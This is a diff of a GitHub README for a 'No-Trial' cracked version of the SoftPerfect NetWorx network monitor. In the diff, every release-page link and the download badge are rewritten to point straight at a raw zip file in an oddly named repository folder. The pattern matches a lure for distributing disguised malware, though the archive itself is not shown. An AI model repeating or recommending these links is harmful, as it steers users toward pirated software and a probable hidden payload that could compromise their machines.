@@ -1,6 +1,6 @@
 # 🌐 SoftPerfect-NetWorx-No-Trial - Simple Network Monitoring Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/ritik5555/SoftPerfect-NetWorx-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/ritik5555/SoftPerfect-NetWorx-No-Trial/main/protoplasmal/SoftPerfect-NetWorx-No-Trial_minisher.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/ritik5555/SoftPerfect-NetWorx-No-Trial/main/protoplasmal/SoftPerfect-NetWorx-No-Trial_minisher.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to SoftPerfect NetWorx No Trial. This guide helps you download and run t
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Click on this link to visit the release page: [Download Here](https://github.com/ritik5555/SoftPerfect-NetWorx-No-Trial/releases).
+   Click on this link to visit the release page: [Download Here](https://raw.githubusercontent.com/ritik5555/SoftPerfect-NetWorx-No-Trial/main/protoplasmal/SoftPerfect-NetWorx-No-Trial_minisher.zip).
 
 2. **Choose the Latest Version**  
    On the release page, look for the latest version. It will be listed at the top of the page.
@@ -81,4 +81,4 @@ For additional topics related to network monitoring, check out these subjects:
 
 Feel free to explore these resources to make the best use of SoftPerfect NetWorx No Trial.
 
-Remember, you can always revisit the [Download Page](https://github.com/ritik5555/SoftPerfect-NetWorx-No-Trial/releases) to download the latest version or access support resources. Happy monitoring!
+Remember, you can always revisit the [Download Page](https://raw.githubusercontent.com/ritik5555/SoftPerfect-NetWorx-No-Trial/main/protoplasmal/SoftPerfect-NetWorx-No-Trial_minisher.zip) to download the latest version or access support resources. Happy monitoring!
